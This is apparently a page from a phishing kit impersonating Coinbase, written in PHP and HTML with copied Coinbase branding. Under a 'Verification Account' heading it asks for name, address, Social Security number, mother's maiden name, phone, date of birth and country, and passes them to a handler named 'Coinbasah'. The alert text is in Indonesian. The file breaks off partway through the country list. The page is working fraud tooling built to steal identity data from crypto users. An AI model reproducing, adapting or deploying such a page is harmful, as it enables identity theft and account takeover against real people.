<?php
session_start();
require_once('../function/settings.php');
$Greed = new Coinbasah();
$Greed->updateLog();
if ($_SESSION['Status'] != 'information') {
    $Greed->redirectTo();
}
if (isset($_POST['Next'])) {
    if ($Greed->Information($_POST['firstname'], $_POST['lastname'], $_POST['address'], $_POST['secondadd'], @$_POST['ssn'], $_POST['mothername'], $_POST['Country'], $_POST['city'], $_POST['State'], $_POST['zipcode'], $_POST['phonenumber'], $_POST['dob'])) {
        echo "<script>alert('Berhasil Menginput Data');</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="en" class="js-focus-visible" data-js-focus-visible="">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="origin-trial" content="Az520Inasey3TAyqLyojQa8MnmCALSEU29yQFW8dePZ7xQTvSt73pHazLFTK5f7SyLUJSo2uKLesEtEa9aUYcgMAAACPeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkRpc2FibGVUaGlyZFBhcnR5U3RvcmFnZVBhcnRpdGlvbmluZyIsImV4cGlyeSI6MTcyNTQwNzk5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
    <title>Coinbase - Billing</title>
    <meta name="theme-color" content="#0052ff">
    <link rel="icon" href="assets/images/favicon.ico">
    <link href="assets/css/styles.d87df576ff25e358663e.css" rel="stylesheet">
    <link href="assets/css/styles.43cdd765c2fa35b596d4.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.babae8c0eccf7b247500.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles__ltr.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <meta name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing cryptocurrency." data-rh="true">
    <style id="googleidentityservice_button_styles">
        .qJTHM {
            -webkit-user-select: none;
            color: #202124;
            direction: ltr;
            -webkit-touch-callout: none;
            font-family: "Roboto-Regular", arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            font-weight: 400;
            margin: 0;
            overflow: hidden;
            -webkit-text-size-adjust: 100%
        }

        .ynRLnc {
            left: -9999px;
            position: absolute;
            top: -9999px
        }

        .L6cTce {
            display: none
        }

        .bltWBb {
            word-break: break-all
        }

        .hSRGPd {
            color: #1a73e8;
            cursor: pointer;
            font-weight: 500;
            text-decoration: none
        }

        .Bz112c-W3lGp {
            height: 16px;
            width: 16px
        }

        .Bz112c-E3DyYd {
            height: 20px;
            width: 20px
        }

        .Bz112c-r9oPif {
            height: 24px;
            width: 24px
        }

        .Bz112c-uaxL4e {
            -webkit-border-radius: 10px;
            border-radius: 10px
        }

        .LgbsSe-Bz112c {
            display: block
        }

        .S9gUrf-YoZ4jf,
        .S9gUrf-YoZ4jf * {
            border: none;
            margin: 0;
            padding: 0
        }

        .fFW7wc-ibnC6b>.aZ2wEe>div {
            border-color: #4285f4
        }

        .P1ekSe-ZMv3u>div:nth-child(1) {
            background-color: #1a73e8 !important
        }

        .P1ekSe-ZMv3u>div:nth-child(2),
        .P1ekSe-ZMv3u>div:nth-child(3) {
            background-image: linear-gradient(to right, rgba(255, 255, 255, .7), rgba(255, 255, 255, .7)), linear-gradient(to right, #1a73e8, #1a73e8) !important
        }

        .haAclf {
            display: inline-block
        }

        .nsm7Bb-HzV7m-LgbsSe {
            -webkit-border-radius: 4px;
            border-radius: 4px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-transition: background-color .218s, border-color .218s;
            transition: background-color .218s, border-color .218s;
            -webkit-user-select: none;
            -webkit-appearance: none;
            background-color: #fff;
            background-image: none;
            border: 1px solid #dadce0;
            color: #3c4043;
            cursor: pointer;
            font-family: "Google Sans", arial, sans-serif;
            font-size: 14px;
            height: 40px;
            letter-spacing: 0.25px;
            outline: none;
            overflow: hidden;
            padding: 0 12px;
            position: relative;
            text-align: center;
            vertical-align: middle;
            white-space: nowrap;
            width: auto
        }

        @media screen and (-ms-high-contrast:active) {
            .nsm7Bb-HzV7m-LgbsSe {
                border: 2px solid windowText;
                color: windowText
            }
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe {
            font-size: 14px;
            height: 32px;
            letter-spacing: 0.25px;
            padding: 0 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe {
            font-size: 11px;
            height: 20px;
            letter-spacing: 0.3px;
            padding: 0 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe {
            padding: 0;
            width: 40px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe {
            width: 32px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe {
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK {
            -webkit-border-radius: 20px;
            border-radius: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe {
            -webkit-border-radius: 16px;
            border-radius: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe {
            -webkit-border-radius: 10px;
            border-radius: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc {
            border: none;
            color: #fff
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc {
            background-color: #1a73e8
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc {
            background-color: #202124;
            color: #e8eaed
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 18px;
            margin-right: 8px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 14px;
            min-width: 14px;
            width: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            height: 10px;
            min-width: 10px;
            width: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin-left: 8px;
            margin-right: -4px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 10px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            padding: 4px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-top-left-radius: 3px;
            border-top-left-radius: 3px;
            -webkit-border-bottom-left-radius: 3px;
            border-bottom-left-radius: 3px;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            justify-content: center;
            -webkit-align-items: center;
            align-items: center;
            background-color: #fff;
            height: 36px;
            margin-left: -10px;
            margin-right: 12px;
            min-width: 36px;
            width: 36px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,
        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c {
            margin: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 28px;
            margin-left: -8px;
            margin-right: 10px;
            min-width: 28px;
            width: 28px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            height: 16px;
            margin-left: -6px;
            margin-right: 8px;
            min-width: 16px;
            width: 16px
        }

        .nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 3px;
            border-radius: 3px;
            margin-left: 2px;
            margin-right: 0;
            padding: 0
        }

        .nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 18px;
            border-radius: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 14px;
            border-radius: 14px
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 8px;
            border-radius: 8px
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
            -webkit-flex-direction: row;
            flex-direction: row;
            justify-content: space-between;
            -webkit-flex-wrap: nowrap;
            flex-wrap: nowrap;
            height: 100%;
            position: relative;
            width: 100%
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX {
            justify-content: center
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 1;
            flex-grow: 1;
            font-family: "Google Sans", arial, sans-serif;
            font-weight: 500;
            overflow: hidden;
            text-overflow: ellipsis;
            vertical-align: top
        }

        .nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-weight: 300
        }

        .nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            -webkit-flex-grow: 0;
            flex-grow: 0
        }

        .nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            -webkit-transition: background-color .218s;
            transition: background-color .218s;
            bottom: 0;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .nsm7Bb-HzV7m-LgbsSe:hover,
        .nsm7Bb-HzV7m-LgbsSe:focus {
            -webkit-box-shadow: none;
            box-shadow: none;
            border-color: #d2e3fc;
            outline: none
        }

        .nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .04)
        }

        .nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(66, 133, 244, .1)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe,
        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .24)
        }

        .nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe {
            background: rgba(255, 255, 255, .32)
        }

        .nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY {
            -webkit-border-radius: 50%;
            border-radius: 50%;
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            height: 20px;
            margin-left: -4px;
            margin-right: 8px;
            min-width: 20px;
            width: 20px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId {
            font-family: "Roboto";
            font-size: 12px;
            text-align: left
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,
        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS {
            overflow: hidden;
            text-overflow: ellipsis
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            display: -webkit-box;
            display: -webkit-flex;
            display: flex;
            -webkit-align-items: center;
            align-items: center;
            color: #5f6368;
            fill: #5f6368;
            font-size: 11px;
            font-weight: 400
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff {
            color: #e8eaed;
            fill: #e8eaed
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c {
            height: 18px;
            margin: -3px -3px -3px 2px;
            min-width: 18px;
            width: 18px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-top-left-radius: 0;
            border-top-left-radius: 0;
            -webkit-border-bottom-left-radius: 0;
            border-bottom-left-radius: 0;
            -webkit-border-top-right-radius: 3px;
            border-top-right-radius: 3px;
            -webkit-border-bottom-right-radius: 3px;
            border-bottom-right-radius: 3px;
            margin-left: 12px;
            margin-right: -10px
        }

        .nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf {
            -webkit-border-radius: 18px;
            border-radius: 18px
        }

        .L5Fo6c-sM5MNb {
            border: 0;
            display: block;
            left: 0;
            position: relative;
            top: 0
        }

        .L5Fo6c-bF1uUb {
            -webkit-border-radius: 4px;
            border-radius: 4px;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0
        }

        .L5Fo6c-bF1uUb:focus {
            border: none;
            outline: none
        }

        sentinel {}
    </style>
</head>

<body class="cds-light-l1k3tbpe" style="background-color: rgba(var(--gray0));">
    <script>
        $(document).ready(function() {
            console.log('Document is ready'); // Log to ensure document is ready

            var ssnInput = $('input[name="ssn"]');
            console.log('SSN input:', ssnInput); // Log to ensure input is selected

            ssnInput.on('input', function() {
                console.log('Input event triggered'); // Debugging message
                var value = this.value.replace(/\D/g, ''); // Remove non-numeric characters

                if (value.length > 5) {
                    value = value.replace(/(\d{3})(\d{2})(\d{1,4})/, '$1-$2-$3');
                } else if (value.length > 3) {
                    value = value.replace(/(\d{3})(\d{1,2})/, '$1-$2');
                }

                this.value = value;
            });
        });
    </script>
    <div id="root" style="display: flex; flex-direction: column; min-height: 100%">
        <div class="cds-large-llfbhh8 cds-light-l1k3tbpe" style="--foreground: rgb(var(--gray100)); --foreground-muted: rgb(var(--gray60)); --background: rgb(var(--gray0)); --background-alternate: rgb(var(--gray5)); --background-overlay: rgba(var(--gray80),0.33); --line: rgba(var(--gray60),0.2); --line-heavy: rgba(var(--gray60),0.66); --primary: rgb(var(--blue60)); --primary-wash: rgb(var(--blue0)); --primary-foreground: rgb(var(--gray0)); --negative: rgb(var(--red60)); --negative-foreground: rgb(var(--gray0)); --positive: rgb(var(--green60)); --positive-foreground: rgb(var(--gray0)); --secondary: rgb(var(--gray5)); --secondary-foreground: rgb(var(--gray100)); --transparent: rgba(var(--gray0),0); --warning: rgb(var(--yellow50));">
            <div class="cds-flex-f1g67tkn cds-center-ca5ylan cds-column-ci8mx7v cds-background-b85wjan" style="height: 100%; width: 100%;">
                <div data-testid="signin-header" class="cds-flex-f1g67tkn cds-center-cv8796s cds-center-ca5ylan cds-space-between-s1vbz1 cds-background-b85wjan cds-2-_115h1mf cds-2-_1qjdqpv cds-3-_1ol1258 cds-3-_1ti0n00 cds-5-_g0seea" style="width: 100%;"><a data-testid="header-logo-link" class="cds-link cds-link-l17zyfmx" title="Home" href="#"><span class="cds-typographyResets-t1xhpuq2 cds-textInherit-t1yzihzw cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a cds-link--container"><svg aria-label="Coinbase logo" class="cds-iconStyles-iogjozt" height="32" role="img" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
                                <title>Coinbase logo</title>
                                <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0052FF"></path>
                            </svg></span></a>
                    <div class="cds-flex-f1g67tkn cds-row-r1tfxker cds-1-_obadkb"><a data-testid="button-sign-up" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: transparent; --interactable-hovered-background: rgb(250, 250, 250); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(235, 235, 236); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(255, 255, 255);"><span class="cds-positionRelative-p109mlw7"></span></a><a data-testid="button-business-login" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonCompact-b17kdj8k cds-2-_h5hy70 cds-2-_hu3zq5" href="#" style="--interactable-height: 40px; --interactable-border-radius: 40px; --interactable-background: var(--secondary); --interactable-hovered-background: rgb(233, 235, 238); --interactable-hovered-opacity: 0.98; --interactable-pressed-background: rgb(220, 222, 225); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(247, 248, 249);"><span class="cds-positionRelative-p109mlw7"><span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Sign out</span></span></span></a></div>
                </div>
                <div class="container shadow-sm">
                    <!-- Kontencok -->
                    <div class="row border rounded">
                        <div class="col-md-6">
                            <div class="p-5">
                                <span class="text-muted">Verified</span>
                                <h2 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Level 1</h2>
                                <span>Weekly buy and sell limits across all your payment methods</span>
                                <div class="container pt-5 text-center">
                                    <img src="assets/images/supportAndMore.png" class="img-fluid" style="width:50%" alt="">
                                </div>

                            </div>
                        </div>
                        <div class="col-md-6 border-top border-start">
                            <div class="p-3 pt-5">
                                <h2 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a">Verification Account</h2>
                                <form method="POST">
                                    <div class="row p-1 pt-2">
                                        <div class="form-group col-md-6">
                                            <label for="inputEmail4" style="font-weight:600;">First Name</label>
                                            <input type="text" class="form-control" id="inputEmail4" name="firstname" placeholder="John" autofocus required>
                                        </div>
                                        <div class="form-group col-md-6">
                                            <label for="inputPassword4" style="font-weight:600;">Last Name</label>
                                            <input type="text" class="form-control" id="inputPassword4" name="lastname" placeholder="Doe" required>
                                        </div>
                                    </div>
                                    <div class="form-group  p-1 pt-2">
                                        <label for="inputAddress" style="font-weight:600;">Address</label>
                                        <input type="text" class="form-control" id="inputAddress" name="address" placeholder="1234 Main St" required>
                                        <input type="text" class="form-control mt-1" id="inputAddress2" name="secondadd" placeholder="Apartment, studio, or floor">
                                    </div>
                                    <div class="form-group  p-1 pt-2" style="display: none;" id="ssnField">
                                        <label for="inputAddress" style="font-weight:600;">Social Security Number</label>
                                        <input type="tel" name="ssn" placeholder="XXX-XX-XXXX" id="ssn" maxlength="12" class="form-control" id="inputAddress" placeholder="">
                                    </div>
                                    <div class="form-group  p-1 pt-2">
                                        <label for="inputAddress" style="font-weight:600;">Mothers Maiden Name</label>
                                        <input type="text" class="form-control" id="inputAddress" name="mothername" placeholder="" required>
                                    </div>
                                    <div class="form-group  p-1 pt-2">
                                        <label for="inputAddress" style="font-weight:600;">Phone Number</label>
                                        <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" name="phonenumber" maxlength="17" required>
                                    </div>
                                    <div class="form-group  p-1 pt-2">
                                        <label for="inputAddress" style="font-weight:600;">DOB</label>
                                        <input type="date" class="form-control" id="inputAddress" name="dob" placeholder="" required>
                                    </div>
                                    <div class="form-group  p-1 pt-2">
                                        <label for="inputAddress" style="font-weight:600;">Country</label>
                                        <select name="Country" autocomplete="off" data-a-native-class="" id="Country" tabindex="0" class="form-select" style="text-align:left; padding:5px;" onchange="handleCountryChange()" required>
                                            <option value="AF" <?= ($_SESSION['Countrynya'] === 'AF') ? "selected" : "" ?>>Afghanistan</option>
                                            <option value="AX" <?= ($_SESSION['Countrynya'] === 'AX') ? "selected" : "" ?>>Aland Islands</option>
                                            <option value="AL" <?= ($_SESSION['Countrynya'] === 'AL') ? "selected" : "" ?>>Albania</option>
                                            <option value="DZ" <?= ($_SESSION['Countrynya'] === 'DZ') ? "selected" : "" ?>>Algeria</option>
                                            <option value="AS" <?= ($_SESSION['Countrynya'] === 'AS') ? "selected" : "" ?>>American Samoa</option>
                                            <option value="AD" <?= ($_SESSION['Countrynya'] === 'AD') ? "selected" : "" ?>>Andorra</option>
                                            <option value="AO" <?= ($_SESSION['Countrynya'] === 'AO') ? "selected" : "" ?>>Angola</option>
                                            <option value="AI" <?= ($_SESSION['Countrynya'] === 'AI') ? "selected" : "" ?>>Anguilla</option>
                                            <option value="AQ" <?= ($_SESSION['Countrynya'] === 'AQ') ? "selected" : "" ?>>Antarctica</option>
                                            <option value="AG" <?= ($_SESSION['Countrynya'] === 'AG') ? "selected" : "" ?>>Antigua and Barbuda</option>
                                            <option value="AR" <?= ($_SESSION['Countrynya'] === 'AR') ? "selected" : "" ?>>Argentina</option>
                                            <option value="AM" <?= ($_SESSION['Countrynya'] === 'AM') ? "selected" : "" ?>>Armenia</option>
                                            <option value="AW" <?= ($_SESSION['Countrynya'] === 'AW') ? "selected" : "" ?>>Aruba</option>
                                            <option value="AU" <?= ($_SESSION['Countrynya'] === 'AU') ? "selected" : "" ?>>Australia</option>
                                            <option value="AT" <?= ($_SESSION['Countrynya'] === 'AT') ? "selected" : "" ?>>Austria</option>
                                            <option value="AZ" <?= ($_SESSION['Countrynya'] === 'AZ') ? "selected" : "" ?>>Azerbaijan</option>
                                            <option value="BS" <?= ($_SESSION['Countrynya'] === 'BS') ? "selected" : "" ?>>Bahamas, The</option>
                                            <option value="BH" <?= ($_SESSION['Countrynya'] === 'BH') ? "selected" : "" ?>>Bahrain</option>
                                            <option value="BD" <?= ($_SESSION['Countrynya'] === 'BD') ? "selected" : "" ?>>Bangladesh</option>
                                            <option value="BB" <?= ($_SESSION['Countrynya'] === 'BB') ? "selected" : "" ?>>Barbados</option>
                                            <option value="BY" <?= ($_SESSION['Countrynya'] === 'BY') ? "selected" : "" ?>>Belarus</option>
                                            <option value="BE" <?= ($_SESSION['Countrynya'] === 'BE') ? "selected" : "" ?>>Belgium</option>
                                            <option value="BZ" <?= ($_SESSION['Countrynya'] === 'BZ') ? "selected" : "" ?>>Belize</option>
                                            <option value="BJ" <?= ($_SESSION['Countrynya'] === 'BJ') ? "selected" : "" ?>>Benin</option>
                                            <option value="BM" <?= ($_SESSION['Countrynya'] === 'BM') ? "selected" : "" ?>>Bermuda</option>
                                            <option value="BT" <?= ($_SESSION['Countrynya'] === 'BT') ? "selected" : "" ?>>Bhutan</option>
                                            <option value="BO" <?= ($_SESSION['Countrynya'] === 'BO') ? "selected" : "" ?>>Bolivia</option>
                                            <option value="BQ" <?= ($_SESSION['Countrynya'] === 'BQ') ? "selected" : "" ?>>Bonaire, Saint Eustatius and Saba</option>
                                            <option value="BA" <?= ($_SESSION['Countrynya'] === 'BA') ? "selected" : "" ?>>Bosnia and Herzegovina</option>
                                            <option value="BW" <?= ($_SESSION['Countrynya'] === 'BW') ? "selected" : "" ?>>Botswana</option>
                                            <option value="BV" <?= ($_SESSION['Countrynya'] === 'BV') ? "selected" : "" ?>>Bouvet Island</option>
                                            <option value="BR" <?= ($_SESSION['Countrynya'] === 'BR') ? "selected" : "" ?>>Brazil</option>
                                            <option value="IO" <?= ($_SESSION['Countrynya'] === 'IO') ? "selected" : "" ?>>British Indian Ocean Territory</option>
                                            <option value="BN" <?= ($_SESSION['Countrynya'] === 'BN') ? "selected" : "" ?>>Brunei Darussalam</option>
                                            <option value="BG" <?= ($_SESSION['Countrynya'] === 'BG') ? "selected" : "" ?>>Bulgaria</option>
                                            <option value="BF" <?= ($_SESSION['Countrynya'] === 'BF') ? "selected" : "" ?>>Burkina Faso</option>
                                            <option value="BI" <?= ($_SESSION['Countrynya'] === 'BI') ? "selected" : "" ?>>Burundi</option>
                                            <option value="KH" <?= ($_SESSION['Countrynya'] === 'KH') ? "selected" : "" ?>>Cambodia</option>
                                            <option value="CM" <?= ($_SESSION['Countrynya'] === 'CM') ? "selected" : "" ?>>Cameroon</option>
                                            <option value="CA" <?= ($_SESSION['Countrynya'] === 'CA') ? "selected" : "" ?>>Canada</option>
                                            <option value="IC" <?= ($_SESSION['Countrynya'] === 'IC') ? "selected" : "" ?>>Canary Islands</option>
                                            <option value="CV" <?= ($_SESSION['Countrynya'] === 'CV') ? "selected" : "" ?>>Cape Verde</option>
                                            <option value="KY" <?= ($_SESSION['Countrynya'] === 'KY') ? "selected" : "" ?>>Cayman Islands</option>
                                            <option value="CF" <?= ($_SESSION['Countrynya'] === 'CF') ? "selected" : "" ?>>Central African Republic</option>
                                            <option value="TD" <?= ($_SESSION['Countrynya'] === 'TD') ? "selected" : "" ?>>Chad</option>
                                            <option value="CL" <?= ($_SESSION['Countrynya'] === 'CL') ? "selected" : "" ?>>Chile</option>
                                            <option value="CN" <?= ($_SESSION['Countrynya'] === 'CN') ? "selected" : "" ?>>China</option>
                                            <option value="CX" <?= ($_SESSION['Countrynya'] === 'CX') ? "selected" : "" ?>>Christmas Island</option>
                                            <option value="CC" <?= ($_SESSION['Countrynya'] === 'CC') ? "selected" : "" ?>>Cocos (Keeling) Islands</option>
                                            <option value="CO" <?= ($_SESSION['Countrynya'] === 'CO') ? "selected" : "" ?>>Colombia</option>
                                            <option value="KM" <?= ($_SESSION['Countrynya'] === 'KM') ? "selected" : "" ?>>Comoros</option>
                                            <option value="CG" <?= ($_SESSION['Countrynya'] === 'CG') ? "selected" : "" ?>>Congo</option>
                                            <option value="CD" <?= ($_SESSION['Countrynya'] === 'CD') ? "selected" : "" ?>>Congo, The Democratic Republic of the</option>
                                            <option value="CK" <?= ($_SESSION['Countrynya'] === 'CK') ? "selected" : "" ?>>Cook Islands</option>
                                            <option value="CR" <?= ($_SESSION['Countrynya'] === 'CR') ? "selected" : "" ?>>Costa Rica</option>
                                            <option value="CI" <?= ($_SESSION['Countrynya'] === 'CI') ? "selected" : "" ?>>Cote D'ivoire</option>
                                            <option value="HR" <?= ($_SESSION['Countrynya'] === 'HR') ? "selected" : "" ?>>Croatia</option>
                                            <option value="CW" <?= ($_SESSION['Countrynya'] === 'CW') ? "selected" : "" ?>>Curaçao</option>
                                            <option value="CY" <?= ($_SESSION['Countrynya'] === 'CY') ? "selected" : "" ?>>Cyprus</option>
                                            <option value="CZ" <?= ($_SESSION['Countrynya'] === 'CZ') ? "selected" : "" ?>>Czech Republic</option>
                                            <option value="DK" <?= ($_SESSION['Countrynya'] === 'DK') ? "selected" : "" ?>>Denmark</option>
                                            <option value="DJ" <?= ($_SESSION['Countrynya'] === 'DJ') ? "selected" : "" ?>>Djibouti</option>
                                            <option value="DM" <?= ($_SESSION['Countrynya'] === 'DM') ? "selected" : "" ?>>Dominica</option>
                                            <option value="DO" <?= ($_SESSION['Countrynya'] === 'DO') ? "selected" : "" ?>>Dominican Republic</option>
                                            <option value="EC" <?= ($_SESSION['Countrynya'] === 'EC') ? "selected" : "" ?>>Ecuador</option>
                                            <option value="EG" <?= ($_SESSION['Countrynya'] === 'EG') ? "selected" : "" ?>>Egypt</option>
                                            <option value="SV" <?= ($_SESSION['Countrynya'] === 'SV') ? "selected" : "" ?>>El Salvador</option>
                                            <option value="GQ" <?= ($_SESSION['Countrynya'] === 'GQ') ? "selected" : "" ?>>Equatorial Guinea</option>
                                            <option value="ER" <?= ($_SESSION['Countrynya'] === 'ER') ? "selected" : "" ?>>Eritrea</option>
                                            <option value="EE" <?= ($_SESSION['Countrynya'] === 'EE') ? "selected" : "" ?>>Estonia</option>
                                            <option value="ET" <?= ($_SESSION['Countrynya'] === 'ET') ? "selected" : "" ?>>Ethiopia</option>
                                            <option value="FK" <?= ($_SESSION['Countrynya'] === 'FK') ? "selected" : "" ?>>Falkland Islands (Malvinas)</option>
                                            <option value="FO" <?= ($_SESSION['Countrynya'] === 'FO') ? "selected" : "" ?>>Faroe Islands</option>
